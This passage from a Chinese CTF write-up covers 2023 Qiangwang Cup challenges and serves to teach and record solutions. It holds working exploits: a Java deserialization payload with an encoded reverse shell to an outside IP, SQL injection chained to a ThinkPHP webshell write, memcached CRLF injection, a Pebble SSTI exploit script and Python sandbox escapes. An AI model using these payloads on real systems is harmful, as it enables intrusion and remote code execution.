'{"serializeData":"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AGFiYXNoIC1jIHtlY2hvLFltRnphQ0F0YVNBK0ppQXZaR1YyTDNSamNDOHhNRFF1TWpJMUxqSXpPQzR4TVRBdk9UazVPU0F3UGlZeH18e2Jhc2U2NCwtZH18e2Jhc2gsLWl9dAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg="}' -vv 8.147.133.154:43668 helloworld.Greeter/ProcessMsg thinkshop 题目给出了一个基于 thinkphp 的 php 服务，模板 goods_edit.html 中存在 unserialize 操作，thinkphp 版本为 5.0.23，可以考虑利用反序列化写入 webshell。 &lt;textarea class="form-control" id="data" name="data" rows="3" required&gt;{php} use app\index\model\Goods;$view=new Goods();echo $view-&gt;arrayToMarkdown(unserialize(base64_decode($goods['data'])));{/php}&lt;/textarea&gt; 编辑商品页面需要登陆 admin 才能访问，数据库中保存的 hash 是 123456 的 md5，但登录部分的代码故意写错，输入 1/123456 才能正常登录。 通过 goods_edit.html 我们可以修改数据库中的 goods 表的 data 字段。但 saveGoods 函数会先将我们的输入进行序列化，然后再保存，最终写入的 payload 都会变成字符串，无法正常触发 thinkphp 利用链。 public function saveGoods($data) { $data['data'] = base64_encode(serialize($this-&gt;markdownToArray($data['data']))); return $this-&gt;save($data); } 但 updatedata 函数存在 sql 注入，可以利用 SQL 注入将 payload 插入到 data 字段。 public function updatedata($data, $table, $id) { if (!$this-&gt;connect()) { die('Error'); } else { $sql = "UPDATE $table SET "; foreach ($data as $key =&gt; $value) { $sql .= "`$key` = unhex('" . bin2hex($value) . "'), "; } $sql = rtrim($sql, ', ') . " WHERE `id` = " . intval($id); return mysqli_query($this-&gt;connect(), $sql); } } 此外，题目在反序列化前还有一个校验操作：从数据库取出 data 时会判断是否以 YTo 开头： public function getGoodsById($id) { $select = new Select(); $data = $select-&gt;select('goods', 'id', $id); if (!empty($data[0]['data']) &amp;&amp; substr($data[0]['data'], 0, 3) !== "YTo") { $this-&gt;error("数据错误" , 'index/admin/goods_edit'); } return $data; } 其实是要求反序列化出来一个数组，可以修改一下 phpggc，包一层数组后再生成 payload： phpggc ThinkPHP/FW1 /var/www/html/ /mnt/share/project/CTF/QWB/thinkshop/shell.php -b -u 发送 payload： POST /public/index.php/index/admin/do_edit.html HTTP/1.1 Host: eci-2zeiwefvnk7dn1jomqhm.cloudeci1.ichunqiu.com Content-Length: 1629 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://eci-2zeiwefvnk7dn1jomqhm.cloudeci1.ichunqiu.com Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://eci-2zeiwefvnk7dn1jomqhm.cloudeci1.ichunqiu.com/public/index.php/index/admin/goods_edit/id/1.html Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie: PHPSESSID=9kfk3dm38nq1p2tbm00p6toad7 Connection: close id=1&amp;name`%3d"",`data`%3d"YToyOntpOjA7aToxO2k6MTtPOjEzOiJ0aGlua1xQcm9jZXNzIjozOntzOjI3OiIAdGhpbmtcUHJvY2VzcwBwcm9jZXNzUGlwZXMiO086Mjg6InRoaW5rXG1vZGVsXHJlbGF0aW9uXEhhc01hbnkiOjU6e3M6ODoiACoAcXVlcnkiO086MjA6InRoaW5rXGNvbnNvbGVcT3V0cHV0IjoyOntzOjk6IgAqAHN0eWxlcyI7YToxOntpOjA7czo1OiJ3aGVyZSI7fXM6Mjg6IgB0aGlua1xjb25zb2xlXE91dHB1dABoYW5kbGUiO086Mjk6InRoaW5rXHNlc3Npb25cZHJpdmVyXE1lbWNhY2hlIjoxOntzOjEwOiIAKgBoYW5kbGVyIjtPOjI4OiJ0aGlua1xjYWNoZVxkcml2ZXJcTWVtY2FjaGVkIjozOntzOjY6IgAqAHRhZyI7YjoxO3M6MTA6IgAqAG9wdGlvbnMiO2E6Mjp7czo2OiJleHBpcmUiO2k6MDtzOjY6InByZWZpeCI7czowOiIiO31zOjEwOiIAKgBoYW5kbGVyIjtPOjIzOiJ0aGlua1xjYWNoZVxkcml2ZXJcRmlsZSI6Mjp7czo2OiIAKgB0YWciO2I6MDtzOjEwOiIAKgBvcHRpb25zIjthOjU6e3M6NjoiZXhwaXJlIjtpOjM2MDA7czoxMjoiY2FjaGVfc3ViZGlyIjtiOjA7czo2OiJwcmVmaXgiO3M6MDoiIjtzOjEzOiJkYXRhX2NvbXByZXNzIjtiOjA7czo0OiJwYXRoIjtzOjU4OiJwaHA6Ly9maWx0ZXIvY29udmVydC5iYXNlNjQtZGVjb2RlL3Jlc291cmNlPS92YXIvd3d3L2h0bWwvIjt9fX19fXM6OToiACoAcGFyZW50IjtPOjE3OiJ0aGlua1xtb2RlbFxNZXJnZSI6MTp7czoxOiJhIjtzOjE6IjEiO31zOjExOiIAKgBsb2NhbEtleSI7czoxOiJhIjtzOjg6IgAqAHBpdm90IjtOO3M6MTM6IgAqAGZvcmVpZ25LZXkiO3M6MzU6IkFBQVBEOXdhSEFnWlhaaGJDZ2tYMGRGVkZ0aFhTazdQejRLIjt9czoyMToiAHRoaW5rXFByb2Nlc3MAc3RhdHVzIjtpOjM7czozMzoiAHRoaW5rXFByb2Nlc3MAcHJvY2Vzc0luZm9ybWF0aW9uIjthOjE6e3M6NzoicnVubmluZyI7YjoxO319fQ%3D%3D"where`id`%3d1%23=1111&amp;price=&amp;on_sale_time=&amp;image=11111&amp;data=%23+FLAG%0D%0A%0D%0A%23%23+%E8%AF%B7%E7%9C%8B%E7%9C%8B%E8%BF%99%E4%B8%AAFLAG%E5%A5%BD%E7%9C%8B%E5%90%97%0D%0A%E5%86%8D%E4%BB%94%E7%BB%86%E4%BB%94%E7%BB%86%E6%83%B3%E4%B8%80%E4%B8%8B%E8%BF%99%E4%B8%AAflag%E6%80%8E%E4%B9%88%E6%89%8D%E8%83%BD%E6%8B%BF%E5%88%B0%E5%91%A2%0D%0A%0D%0A 然后访问编辑页面即可触发写入 webshell。 thinkshopping 比赛时没有写出，参考其他 writeup 进行复盘： [CTF复现计划]2023强网杯初赛 thinkshop[ping] 第七届 强网杯 全国网络安全挑战赛 Web Writeup - Boogiepop Doesn’t Laugh thinkshopping 的环境与 thinkshop 有所不同： 移除了 good_edit.html 中反序列化的操作。 移除了数据库中的 admin 用户，这导致正常情况下无法登陆。 数据库中将 secure-file-priv 置空（thinkshop 中为非 web 目录），因此可以通过 load_file 读取 flag 文件，sql 注入漏洞依然存在，所以只需要登陆后台即可读取 flag。 注意到登陆处配置了 cache，登陆时会尝试从缓存中获取数据。 // 尝试从缓存中获取数据 $adminData = Db::table('admin') -&gt;cache(true, $Expire) -&gt;find($username); 并且 thinkphp 里配置了 cache 方式为 Memcached，查看 phpinfo 可以判断 memcached 版本为 2.2.0. 'cache' =&gt; [ // 驱动方式 'type' =&gt; 'Memcached', // 缓存保存目录 'path' =&gt; CACHE_PATH, // 缓存前缀 'prefix' =&gt; '', // 缓存有效期 0表示永久缓存 'expire' =&gt; 0, ], 参考:php-memcached CRLF绕过 - FreeBuf网络安全行业门户 memcached 2.2.0 以下存在 CRLF 漏洞。 poc 如下： http://127.0.0.1/test.php?token=TOKEN%00%0D%0Aset%20snowwolf%200%20500%204%0D%0Awolf # 等价于 set snowwolf 0 500 4 wolf memcached 的 set 语法如下: set key flags exptime bytes [noreply] value key：用于从Memcached中存储和检索数据的键。 flags：服务器与用户提供的数据一起存储的 32 位无符号整数，并在检索项目时与数据一起返回。 exptime：以秒为单位的过期时间。0表示没有延迟。如果 exptime 大于30天，Memcached将其用作UNIX时间戳以进行过期。 bytes：需要存储的数据块中的字节数。这是存储在 Memcached 中的数据的长度。 noreply：这是一个可选参数。它用于通知服务器不发送任何回复。 value：需要存储的数据。在执行带有上述选项的命令后，需要在新行上传递数据。 thinkphp 中的 find 函数可以在 thinkphp/library/think/db/Query.php 中找到，如果开启了 cache。查询数据时会获取 think:shop.admin|username 的值。 if (empty($options['fetch_sql']) &amp;&amp; !empty($options['cache'])) { // 判断查询缓存 $cache = $options['cache']; if (true === $cache['key'] &amp;&amp; !is_null($data) &amp;&amp; !is_array($data)) { $key = 'think:' . $this-&gt;connection-&gt;getConfig('database') . '.' . (is_array($options['table']) ? key($options['table']) : $options['table']) . '|' . $data; } elseif (is_string($cache['key'])) { $key = $cache['key']; } elseif (!isset($key)) { $key = md5($this-&gt;connection-&gt;getConfig('database') . '.' . serialize($options) . serialize($this-&gt;bind)); } $result = Cache::get($key); 这个值在 memcached 中的格式可以通过下面的测试代码来获取： public function test(){ $result = Db::query("select * from admin where id=1"); var_dump($result); $a = "think:shop.admin|admin"; Cache::set($a, $result, 3600); } 运行后可以得到正常的格式： a:1:{i:0;a:3:{s:2:"id";i:1;s:8:"username";s:5:"admin";s:8:"password";s:32:"21232f297a57a5a743894a0e4a801fc3";}} 还有一个需要注意的地方是，memcached 在写入数据时，flag 字段是留给用户自定义的，thinkphp 在写入不同类型的数据时，会设定不同的 flag 值，如 0 表示字符串，4 表示数组，数据库获取到的数据存储到 Memcached 时，使用的 flag 值就是 4。 所以利用 CRLF 写入时，也需要将 flag 值设定为 4，payload 如下： set think:shop.admin|admin 4 500 101 a:3:{s:2:"id";i:1;s:8:"username";s:5:"admin";s:8:"password";s:32:"21232f297a57a5a743894a0e4a801fc3";} exp: username=admin%00%0D%0Aset%20think%3Ashop.admin%7Cadmin%204%20500%20101%0D%0Aa%3A3%3A%7Bs%3A2%3A%22id%22%3Bi%3A1%3Bs%3A8%3A%22username%22%3Bs%3A5%3A%22admin%22%3Bs%3A8%3A%22password%22%3Bs%3A32%3A%2221232f297a57a5a743894a0e4a801fc3%22%3B%7D&amp;password=admin hellospring 题目提供了一个使用 pebble 作为渲染引擎的 Spring 服务，pebble 3.1.5 存在模板注入漏洞，参考：- Spring 场景下突破 pebble 模板注入限制 - 知乎 文章提供的 payload 可以在本地打通，但目标测试时不会远程加载 xml，猜测不出网，所以可以先将 xml 文件内容写入本地，然后利用 file 协议从本地读取 xml。 另外，测试时发现 xml 是可以写入 /tmp 并且访问到的，但模板却怎么也写不进去。猜测服务端做了某种过滤，一步一步打印出来看是否能够正常加载。 {% set y= beans.get("org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory").resourceLoader.classLoader.loadClass("java.beans.Beans") %} {% set yy = beans.get("jacksonObjectMapper").readValue("{}", y) %} {{ yy }} 当添加了下面这一句就无法正常写入了，猜测是对 org.springframework.context.support.ClassPathXmlApplicationContext 进行了过滤。 {% set yyy = yy.instantiate(null,"org.springframework.context.support.ClassPathXmlApplicationContext") %} 最后发现仅仅是做了一个字符过滤，换为拼接即可绕过： "org.springframework.context"+".support.ClassPathXmlApplicationContext" exp 如下： import requests import datetime import time host = "http://eci-2zeiuc2hk7njlsvn9mue.cloudeci1.ichunqiu.com:8088" # host = "http://127.0.0.1:8088" url = host + "/uploadFile" proxies = { "http":"http://127.0.0.1:8080", "https":"http://127.0.0.1:8080" } def calc_time(date_string): date_object = datetime.datetime.strptime(date_string, '%a, %d %b %Y %H:%M:%S %Z') t = int(date_object.strftime('%H%M%S')) # t -= 50000 print(f"[+] t: {t}") return t def trigger(t,exp=False): t -= 4 if exp: loop = 16 else: loop = 100 for _ in range(loop): file_name = f"file_20231217_{str(t).rjust(6,'0')}" trigger_url = f"{host}/?x={file_name}" res = requests.get(trigger_url,proxies=proxies) if "constructor-arg" in res.text: print(f"[+] find exp in /tmp/{file_name}") return f"file:///tmp/{file_name}" else: t += 1 continue def upload(): exp1 = { "content": '''&lt;?xml version="1.0" encoding="UTF-8" ?&gt; &lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation=" http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"&gt; &lt;bean id="pb" class="java.lang.ProcessBuilder" init-method="start"&gt; &lt;constructor-arg &gt; &lt;list&gt; &lt;value&gt;bash&lt;/value&gt; &lt;value&gt;-c&lt;/value&gt; &lt;value&gt;{echo,Y2F0IC9mbGFnID4gL3RtcC8xMjMxMjQucGViYmxl}|{base64,-d}|{bash,-i}&lt;/value&gt; &lt;/list&gt; &lt;/constructor-arg&gt; &lt;/bean&gt; &lt;/beans&gt; ''' } res = requests.post(url,data=exp1,proxies=proxies) date_string = res.headers['Date'] return calc_time(date_string) def exploit(exp_path): exp2 = { "content":'''{% set y= beans.get("org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory").resourceLoader.classLoader.loadClass("java.beans.Beans") %} {% set yy = beans.get("jacksonObjectMapper").readValue("{}", y) %} {% set yyy = yy.instantiate(null,"org.springframework.context"+".support.ClassPathXmlApplicationContext") %} {{ yyy.setConfigLocation("''' + exp_path + '''.pebble") }} {{ yyy.refresh() }}''' # "content":"111111" } res = requests.post(url,data=exp2,proxies=proxies) date_string = res.headers['Date'] return calc_time(date_string) t = upload() file_path = trigger(t) time.sleep(10) t = exploit(file_path) trigger(t,True) exp 中的爆破时间其实没有必要，写入的速度其实比较快。 我本地的时区不同，因此加上了 t -= 50000 这一句。 easyphp 一个以 xcache 为背景的逆向题： 解题步骤可参考：第七届 强网杯 全国网络安全挑战赛 Web Writeup - Boogiepop Doesn’t Laugh 不太很理解这道题的应用场景🤣，正常情况下 xcache 只会在 /tmp 下。 解题思路如下： 找出 libphp 基地址，然后根据该地址修复 xcache 文件中的函数指针，使得该文件可以被本地正常加载。 加载起来后使用 xdebug trace 日志辅助分析代码运行流程。 记录一下 xcache 环境的搭建过程。 wget http://xcache.lighttpd.net/pub/Releases/3.2.0/xcache-3.2.0.tar.gz tar zxvf xcache-3.2.0.tar.gz cd xcache-3.2.0 phpize ./configure --enable-xcache --enable-xcache-encoder --enable-xcache-decoder --enable-xcache-assembler --enable-xcache-disassembler --with-php-config=/usr/bin/php-config make &amp; make install 但我本地一直没有自动生成该 mmap 文件，手动创建该文件后权限设定为 777，重启后可以生成。 MISC pyjail1 题目源码如下： import code, os, subprocess import pty def blacklist_fun_callback(*args): print("Player! It's already banned!") pty.spawn = blacklist_fun_callback os.system = blacklist_fun_callback os.popen = blacklist_fun_callback subprocess.Popen = blacklist_fun_callback subprocess.call = blacklist_fun_callback code.interact = blacklist_fun_callback code.compile_command = blacklist_fun_callback vars = blacklist_fun_callback attr = blacklist_fun_callback dir = blacklist_fun_callback getattr = blacklist_fun_callback exec = blacklist_fun_callback __import__ = blacklist_fun_callback compile = blacklist_fun_callback breakpoint = blacklist_fun_callback del os, subprocess, code, pty, blacklist_fun_callback input_code = input("Can u input your code to escape &gt; ") blacklist_words = [ "subprocess", "os", "code", "interact", "pty", "pdb", "platform", "importlib", "timeit", "imp", "commands", "popen", "load_module", "spawn", "system", "/bin/sh", "/bin/bash", "flag", "eval", "exec", "compile", "input", "vars", "attr", "dir", "getattr" "__import__", "__builtins__", "__getattribute__", "__class__", "__base__", "__subclasses__", "__getitem__", "__self__", "__globals__", "__init__", "__name__", "__dict__", "._module", "builtins", "breakpoint", "import", ] def my_filter(input_code): for x in blacklist_words: if x in input_code: return False return True while '{' in input_code and '}' in input_code and input_code.isascii() and my_filter(input_code) and "eval" not in input_code and len(input_code) &lt; 65: input_code = eval(f"f'{input_code}'") else: print("Player! Please obey the filter rules which I set!") 题目主要设置了几个防护： 将一些敏感函数使用 blacklist_fun_callback 进行覆盖。 pty.spawn = blacklist_fun_callback os.system = blacklist_fun_callback os.popen = blacklist_fun_callback subprocess.Popen = blacklist_fun_callback subprocess.call = blacklist_fun_callback code.interact = blacklist_fun_callback code.compile_command = blacklist_fun_callback 将一些 builtins 中的函数进行覆盖： vars = blacklist_fun_callback attr = blacklist_fun_callback dir = blacklist_fun_callback getattr = blacklist_fun_callback exec = blacklist_fun_callback __import__ = blacklist_fun_callback compile = blacklist_fun_callback breakpoint = blacklist_fun_callback 删除了 os, subprocess, code, pty 库。 设置了一个黑名单 blacklist_words，过滤了一些敏感的函数名，但没有过滤 open、write 等文件操作函数。（help 也没有过滤，但进入文档后无法输入 :） 控制输入的长度为 65 以下，并且只能输入 ascii 字符，unicode 就用不了了。 最后通过 f string 来执行代码。 由于没有过滤 open 函数，我们可以直接读取文件内容： {print(open("/etc/passwd").read())} 读取 /proc/self/environ 时可以读取到 flag。 pyjail2 解法 1：写文件 pyjail2 的源代码没有变，但 flag 值不在 /proc/self/environ 中了。由于 write 函数没有被过滤，我们可以先写入一个 python 文件，然后加载该文件来 getshell。 由于脚本本身加载了 code 模块，我们在当前目录写一个 code.py，再次运行该脚本时，就会加载我们写入的 code.py，如果我们写入下面的内容，就可以直接获取 shell。 __import__('os').system("bash") 由于限制了输入长度不能够超过 64，因此我们需要切分写入，例如： {open("a","w").write("__im")} {open("a","a").write("port_")} 注意，当我们需要写入含有单引号的字符时，如果直接使用 {open("a","a").write("_('o")} 会出现报错: Traceback (most recent call last): File "&lt;string&gt;", line 1, in &lt;module&gt; File "&lt;string&gt;", line 1 f'{open("a","a").write("s'")}' ^ SyntaxError: unterminated string literal (detected at line 1) 这是由于经过外层的 f string 之后，eval 执行的是如下的字符串，由于单引号没有闭合，所以无法执行，但我们加入反斜杠后，又会出现下面的错误，f-string 表达式部分不能包含反斜杠。 f-string expression part cannot include a backslash 但实际我们可以直接闭合掉两头的字符串，避免受到 f-string 的限制： 输入：',open("a","a").write("s'"),' 拼接后为：eval('f\'\',open("a","a").write("s\'"),\'\'') 将 payload 写入文件 a 后，可以将内容写入 code.py，由于 code 也被过滤了，所以可以通过字符串拼接来绕过： {1}',open('cod'+'e.py','w').write(open('a').read()),' 写入 code.py 后，再加载一次即可进入 bash。 完整 exp： {open("a","w").write("__im")} {open("a","a").write("port_")} {1}',open("a","a").write("_('o"),' {1}',open("a","a").write("s').syste"),' {1}',open("a","a").write("m('bash')"),' {1}',open('cod'+'e.py','w').write(open('a').read()),' 解法 2：清空 blacklist_words 该利用手法的思路如果： 将 blacklist_words 置空，然后利用 input() 来绕过长度限制进一步输入内容。 利用 globals()[builtins] 获取到内置模块，从而获取原始的内置函数。 具体可参考文章：2023 强网杯 Writeup - CN-SEC 中文网 全局变量 blacklist_words 可以通过 globals() 获取，下面的 payload 即可将该全局变量清空： list(globals().values())[-2].clear() 清空之后，就可以使用黑名单的函数了，但由于长度限制，我们可以使得 eval 执行后返回 {input()}，例如： # {[list(globals().values())[-2].clear(),"(inpu""t())}"][1]} 离谱了，之前把括号写错了。。。下面才是正确的 payload。 {[list(globals().values())[-2].clear(),"{inpu""t()}"][1]} # input_code = eval(f"f'{input_code}'") 后可以得到 {input()} 由于 while 循环的存在，会再次进入 eval，执行 eval(“f’{input()}’”) 会打开输入。 由于 blacklist_fun_callback 仅仅覆盖的是当前命名空间中的 breakpoint 函数，我们可以通过 globals()["__builtins__"] 获取到原始的 builtins 函数。因此我们再传入下面的 payload 即可打开 breakpoint 的 Pdb 交互式命令行. {globals()["__builtins__"].breakpoint()} 进入命令行后，可以通过 os.listdir 或者 glob.glob 方法列目录。 import os os.listdir("/") 另外，os 模块除了 system 以外，还有别的模块也是可以 getshell 的，比如： os.posix_spawn("/bin/bash", ["/bin/bash"], os.environ) 方法多多，具体可参考我此前的博客：CTF Pyjail 沙箱逃逸原理合集 pyjail3 这道题涉及到了 AST 绕过，但限制非常死，源码如下： import ast BAD_ATS = { ast.Attribute, ast.Subscript, ast.comprehension, ast.Delete, ast.Try, ast.For, ast.ExceptHandler, ast.With, ast.Import, ast.ImportFrom, ast.Assign, ast.AnnAssign, ast.Constant, ast.ClassDef, ast.AsyncFunctionDef, } BUILTINS = { "bool": bool, "set": set, "tuple": tuple, "round": round, "map": map, "len": len, "bytes": bytes, "dict": dict, "str": str, "all": all, "range": range, "enumerate": enumerate, "int": int, "zip": zip, "filter": filter, "list": list, "max": max, "float": float, "divmod": divmod, "unicode": str, "min": min, "range": range, "sum": sum, "abs": abs, "sorted": sorted, "repr": repr, "object": object, "isinstance": isinstance } def is_safe(code): if type(code) is str and "__" in code: return False for x in ast.walk(compile(code, "&lt;QWB7th&gt;", "exec", flags=ast.PyCF_ONLY_AST)): if type(x) in BAD_ATS: return False return True if __name__ == "__main__": user_input = "" while True: line = input() if line == "": break user_input += line user_input += "\n" if is_safe(user_input) and len(user_input) &lt; 1800: exec(user_input, {"__builtins__": BUILTINS}, {}) BAD_ATS 过滤了非常多的 AST 类型，其中影响比较大的是下面的这几个： ast.Attribute：最为致命，意味着 . 号获取属性无法使用。 ast.Constant：无法使用常量，但我们可以通过函数来获取常量，例如 str(len[[]])=’0’ ast.Subscript：无法使用索引、切片等。 ast.ClassDef：不能够定义类。 ast.For：不能使用 for 循环 BUILTINS 中能够使用的函数都不具备 RCE 或者操作文件系统的功能，那么我们的思路就是绕过 no builtins。 构造: [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_wrap_close"][0]["system"]("bash") 绕过 ast.Attribute 获取属性 如何绕过 ast.Attribute？python 3.10 中引入了一个新的特性：match/case，类似其他语言中的 switch/case，但 match/case 更加强大，除了可以匹配数字字符串之外，还可以匹配字典、对象等。 最简单的示例，匹配字符串： item = 2 match item: case 1: print("One") case 2: print("Two") # Two 还可以匹配并自动赋值给局部变量，传入 (1,2) 时，会进入第二个分支，并对 x,y 赋值。 item = (1, 2) match item: case (x, y, z): print(f"{x} {y} {z}") case (x, y): print(f"{x} {y}") case (x,): print(f"{x}") 对于基本类型的匹配比较好理解，下面是一个匹配类的示例： class AClass: def __init__(self, value): self.thing = value item = AClass(32) match item: case AClass(thing=x): print(f"Got {x = }!") # Got x = 32! 在这个示例中，重点关注case AClass(thing=x)，这里的含义并非是将 x 赋值给 thing，我们需要将其理解为一个表达式，表示匹配类型为 AClass 且存在 thing 属性的对象，并且 thing 属性值自动赋值给 x。 这样一来就可以在不适用 . 号的情况下获取到类的属性值。例如获取 ''.__class__，我们可以编写如下的 match/case 语句： match str(): case str(__class__=x): print(x==''.__class__) # True 可以看到 x 就是 ''.__class__. 因为所有的类都输入 object 类，所以我们可以使用 object 来替代 str，这样就无需关注匹配到的到底是哪个类。 match str(): case object(__class__=x): print(x==''.__class__) # True 再测试一下该 payload 的 AST： import os import ast a = ''' match str(): case str(__class__=x): print(x) ''' print(ast.dump(ast.parse(a, mode='exec'), indent=4)) AST 如下： Module( body=[ Match( subject=Call( func=Name(id='str', ctx=Load()), args=[], keywords=[]), cases=[ match_case( pattern=MatchClass( cls=Name(id='str', ctx=Load()), patterns=[], kwd_attrs=[ '__class__'], kwd_patterns=[ MatchAs(name='x')]), body=[ Expr( value=Call( func=Name(id='print', ctx=Load()), args=[ Name(id='x', ctx=Load())], keywords=[]))])])], type_ignores=[]) 可以看到确实没有 Attribute，依据这个原理，就可以绕过 ast.Attribute 我们可以构造替代 ''.__class__.__base__.__subclasses__()的 payload： match str(): case object(__class__=clazz): match clazz: case object(__base__=bass): match bass: case object(__subclasses__=subclazz): print(subclazz) 绕过 ast.Assign 赋值变量 ast.Assign 无法使用时，我们无法直接使用 = 来进行赋值，此时可以使用海象表达式进行绕过。例如： [ system:=111, bash:=222 ] 此时 AST 树如下,海象表达式用到的是 ast.NamedExpr 而非 ast.Assign Module( body=[ Expr( value=List( elts=[ NamedExpr( target=Name(id='system', ctx=Store()), value=Constant(value=111)), NamedExpr( target=Name(id='bash', ctx=Store()), value=Constant(value=222))], ctx=Load()))], type_ignores=[]) 绕过 ast.Constant 获取数字、字符串 题目限制了 ast.Constant，所以我们无法直接使用数字、字符串常量，但通过其他的函数组合我们可以构造出数字和字符串。 例如： "" : str() 0 : len([]) "0": str(len([])) "1": str(len([str()])) 或 str(len([min])) "2": str(len([str(),str()])) 或 str(len([min,max])) 'A': chr(len([min,min,min,min,min])*len([min,min,min,min,min,min,min,min,min,min,min,min,min])) 如果要用数字来构造字符串，通常需要用到 chr 函数，虽然题目的 builtins 没有直接提供 chr 函数，但我们也可以自己手动实现一个 chr。 当然，题目 builtins 允许 dict 和 list，我们可以直接用这两个函数直接构造出字符串，这种方式在我此前的博客：pyjail bypass-02 绕过基于字符串匹配的过滤 中有提到过。 在这个 payload 中，我们需要构造出 _wrap_close、system、bash [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_wrap_close"][0]["system"]("bash") 那么我们就可以通过下面的方式获取到这几个字符串： list(dict(system=[]))[0] # system list(dict(_wrap_close=[]))[0] # _wrap_close list(dict(bash=[]))[0] # bash 绕过 ast.Subscript 获取列表/字典元素 题目同时限定了 ast.Subscript，我们无法直接使用索引。但 BUILTINS 中给出了 min 函数，该函数可以获取列表中最小的元素，当列表中只有一个元素时，就可以直接取值。 min(list(dict(system=[]))) # system min(list(dict(_wrap_close=[]))) # _wrap_close min(list(dict(bash=[]))) # bash 如果要获取字典元素，可以利用 get 函数来替代 Subscript。例如我需要在 globals 字典中获取 key 为 system 的元素，可以配合 match/case 来获取。 match globals: case object(get=get_func): get_func("system") 绕过 ast.For 遍历列表 在构造最终 payload 中，我们还需要在 __subclasses__()得到的列表中获取到 _wrap_close 类。 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_wrap_close"][0]["system"]("bash") 当列表中不只有一个元素且列表中的元素之间无法比较时，正常情况下可以使用 for 来遍历并判断，但 ast.For 被题目过滤了，此时我们可以使用 filter，如下所示： def filter_func(subclazzes_item): [ _wrap_close:=min(list(dict(_wrap_close=[])))] match subclazzes_item: case object(_＿name_＿=name): if name==_wrap_close: return subclazzes_item [ subclazzes_item:=min(filter(filter_func,subclazzes())) ] fitler 中使用 match/case 和 if 来进行过滤。 除了使用 filter 函数外，还可以使用 iter 和 next 函数来遍历列表，但题目 BUILTINS 中没有给出这两个函数。 EXP 整合了所有的绕过手段，其实就可以编写出 payload 了。 match str(): case object(_＿class_＿=clazz): match clazz: case object(_＿base_＿=bass): match bass: case object(_＿subclasses_＿=subclazzes): [ system:=min(list(dict(system=[]))), bash:=min(list(dict(bash=[]))) ] def filter_func(subclazzes_item): [ _wrap_close:=min(list(dict(_wrap_close=[])))] match subclazzes_item: case object(_＿name_＿=name): if name==_wrap_close: return subclazzes_item [ subclazzes_item:=min(filter(filter_func,subclazzes())) ] match subclazzes_item: case object(_＿init_＿=initz): match initz: case object(_＿globals_＿=globals): match globals: case object(get=get_func): get_func(system)(bash) 新学到的一些绕过手法也会同步更新到 